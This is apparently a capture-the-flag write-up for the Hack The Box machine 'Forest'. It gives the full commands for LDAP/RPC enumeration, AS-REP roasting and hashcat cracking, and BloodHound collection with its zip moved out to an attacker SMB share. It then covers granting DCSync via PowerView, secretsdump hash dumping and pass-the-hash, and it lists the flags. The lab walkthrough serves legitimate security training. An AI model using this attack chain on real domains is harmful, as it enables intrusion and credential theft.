# Forest - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.161

smbmap -H 10.10.10.161
#no shares listed

#enumerating ldap using ldapsearch
ldapsearch -H ldap://10.10.10.161 -x
#we need to specify DN

ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts
#this gives DC=htb,DC=local

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" 
#ldap search query

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" "objectclass=user"
#find user accounts

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" "objectclass=user" sAMAccountName | grep sAMAccountName
#gives possible usernames

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" "objectclass=user" sAMAccountName | grep sAMAccountName | awk -F ": " '{print $2}' > ldapusers.txt
#filter possible usernames and save it to file

vim ldapusers.txt
#remove the unnecessary usernames

enum4linux 10.10.10.161
#gives another username 'svc-alfresco'

rpcclient -U "" -N 10.10.10.161
#enumerate using rpcclient

enumdomusers
#enumerate users in rpcclient
#this also shows username 'svc-alfresco'

enumdomgroups
#enumerate groups

querygroup 0x13ed

queryusergroups 0x47b
#query groups for svc-alfresco user
#shows groups 0x201 and 0x47c

querygroup 0x201

querygroup 0x47c

#kerberoasting using impacket
GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile ldapusers.txt -request
#this gives us a hash

hashcat -a 0 -m 18200 krbhash.txt /usr/share/wordlists/rockyou.txt
#cracks the hash

evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
#get shell

#get user flag from Desktop

#in attacker machine, use smbserver
sudo smbserver.py share . -smb2support -username user -password Password123

#in evil-winrm as svc-alfresco
#auth smbserver using creds
net use \\10.10.14.3\share /USER:user Password123

copy \\10.10.14.3\share\winPEASx64.exe C:\Users\svc-alfresco\Documents\winpeas.exe

.\winpeas.exe
#check for privesc
#this does not give us anything
#we can enumerate AD using bloodhound

#setup bloodhound and neo4j
cd /opt

git clone https://github.com/BloodHoundAD/BloodHound.git

cd BloodHound

#get the bloodhound linux x64 binary
wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-linux-x64.zip

unzip BloodHound-linux-x64.zip

cd BloodHound-linux-x64.zip

ls -la
#we have our bloodhound binary

#setup neo4j, follow bloodhound wiki
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -

echo 'deb https://debian.neo4j.com stable latest' > /etc/apt/sources.list.d/neo4j.list

sudo apt-get update

sudo apt-get install apt-transport-https

sudo apt-get install neo4j

sudo systemctl stop neo4j

sudo neo4j console
#starts neo4j
#localhost:7474, change creds from neo4j:neo4j to neo4j:bloodhound

#start bloodhound
cd /opt/BloodHound/BloodHound-linux-x64

./BloodHound --no-sandbox
#use new creds set for neo4j and login

#in evil-winrm session, transfer SharpHound.exe from attacker
copy \\10.10.14.3\share\SharpHound.exe C:\Users\svc-alfresco\Documents\SharpHound.exe

#execute SharpHound
.\SharpHound.exe -c all

#exfiltrate .zip file to attacker machine
move 20221222214109_BloodHound.zip \\10.10.14.3\share\20221222214109_BloodHound.zip

#feed this .zip into bloodhound gui

#check privesc route

#add new user, as we are part of Account Operators
net user htb-sv Password123 /add /domain

net group "Exchange Windows Permissions"
#no members

#add new user as member to the group
net group "Exchange Windows Permissions" /add htb-sv

#get powerview from attacker
copy \\10.10.14.3\share\PowerView.ps1 C:\Users\svc-alfresco\Documents\PowerView.ps1

#follow steps from abuse info section in BloodHound

$SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
#create a pscredential object
$Cred = New-Object System.Management.Automation.PSCredential('HTB\htb-sv', $SecPassword)

#import powerview module
Import-Module .\PowerView.ps1

Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
#this does not work
#we have to be specific

Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity htb-sv -TargetIdentity htb.local -Rights DCSync

#on attacker machine
#using secretsdump.py to dump hashes
secretsdump.py htb.local/htb-sv:Password123@10.10.10.161
#this does not work

#running the Add-DomainObjectAcl command again in different format
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity htb-sv -TargetIdentity "DC=htb,DC=local" -Rights DCSync

#in attacker machine
secretsdump.py htb.local/htb-sv:Password123@10.10.10.161
#this works, and we get hashes

evil-winrm -u Administrator -H <admin-ntlm-hash> -i 10.10.10.161
#we get login
#get root flag
```

* Open ports & services:

  * 53 - domain - Simple DNS Plus
  * 88 - kerberos-sec - Kerberos
  * 135 - msrpc - RPC
  * 139 - netbios-ssn - netbios-ssn
  * 389 - ldap - AC LDAP
  * 445 - microsoft-ds - Windows Server 2016 Standard 14393 microsoft-ds
  * 593 - ncacn_http - RPC over HTTP 1.0
  * 3268 - ldap - AD LDAP
  * 5985 - http - HTTPAPI httpd 2.0
  * 9389 - mc-nmf - .NET Message Framing

* ```nmap``` gives us the FQDN 'FOREST.htb.local'.

* We can check SMB shares first using ```smbclient``` or ```smbmap```, but we do not get any shares listed.

* Next, we can attempt enumerating ```ldap``` with the help of ```ldapsearch```.

* With flags ```base namingcontexts```, we get ```DC=htb,DC=local``` - this can be used for specifying the DN.

* Using the required flags "objectclass=user" and "sAMAccountName", we get the user accounts output needed from ```ldapsearch```.

* We can filter the user accounts generated - this gives us 5 possible usernames.

* We can also use ```enum4linux``` - this gives us an extra username 'svc-alfresco'.

* Furthermore, as this machine uses RPC, we can use ```rpcclient``` to [enumerate users & groups](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/).

* In ```rpcclient```, we can use the enumeration functions such as ```enumdomusers```, ```enumdomgroups```, ```querygroup``` and ```queryuser```.

* By enumerating, we can find out that the 'svc-alfresco' user belongs to the groups "Domain Users" and "Service Accounts".

* Now, we can attempt ```Kerberoasting``` using ```GetNPUsers.py``` - this script lists TGTs for users that have the property "Do not require Kerberos preauthentication" set.

* As this script can be used for abusing ```Kerberos``` against 'AS-REP Roasting' attack, we can attempt to use it here.

* Using ```GetNPUsers.py```, we get a hash output for 'svc-alfresco'.

* This hash can be cracked using ```hashcat```, and it gives us the password "s3rvice" upon cracking.

* We can login using ```evil-winrm``` and get shell as 'svc-alfresco'.

* We can get the user flag from this user's Desktop.

* Now, we can check for privesc using ```winpeas.exe```; to transfer this from attacker to target, we can use ```smbserver.py```.

* ```winpeas``` does not show any privesc route, but we know that we are in an AD environment, so we can use ```bloodhound``` too.

* We can get ```bloodhound``` from the GitHub repo, and download the latest linux binary; for ```neo4j``` setup, we have to follow the ```bloodhound``` Docs.

* ```sudo neo4j console``` starts the server; we can change default creds neo4j:neo4j to neo4j:bloodhound.

* ```./BloodHound --no-sandbox``` starts ```bloodhound```; we can use the new creds here to login.

* Now, we can transfer ```SharpHound.exe``` from attacker to victim session, and execute it accordingly.

* This generates a .zip file which needs to be fed into the ```bloodhound``` GUI; we need to exfiltrate this file to the attacker machine first.

* In the GUI, we can mark 'svc-alfresco' node as Owned; then we can use the pre-built analytic queries such as "Shortest Path from Owned Principals" and "Shortest Paths to Domain Admins".

* From the visualization, we get the following info:

  * 'svc-alfresco' is MemberOf 'Service Accounts', which is MemberOf 'Privileged IT Accounts', which is MemberOf 'Account Operators'

  * 'Account Operators' has GenericAll privileges of 'Exchange Windows Permissions', which has 'WriteDacl' permissions on domain 'htb.local', which includes the Administrator account.

* So, we can create an user as we are part of 'Account Operators', then we can use the 'WriteDacl' permissions of 'Exchange Windows Permissions' for privilege escalation.

* Once our newly-created user has joined 'Exchange Windows Permissions', we can get ```PowerView.ps1``` from the attacker machine for the next steps.

* From the 'Abuse info' section in ```bloodhound```, we get the following info for abusing 'WriteDacl' as 'Exchange Windows Permissions' member:

  ```text
  To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges.
  
  You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member.
  
  To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object.
  
  Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
  ```

  ```ps
  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
  
  $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
  
  Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
  ```

* We can follow these commands step-by-step; for the ```Add-DomainObjectAcl``` command from ```PowerSploit```, we would have to modify it by adding the flag ```PrincipalIdentity```.

* Now, we can attempt to dump hashes using ```secretsdump.py``` in attacker machine; but this does not work.

* If we run the ```Add-DomainObjectAcl``` in a different format this time, it runs successfully, and our user gets DCSync rights.

* Now, running ```secretsdump.py``` dumps the NTLM hashes.

* We can use the hash dumped for Administrator, and login via ```evil-winrm``` using Pass-the-Hash method, and get root flag.

```markdown
1. User flag - f069fb9c42f8633a65282c002837f089

2. Root flag - 3d12a7da3b473182f4ce99093d9995fb
```
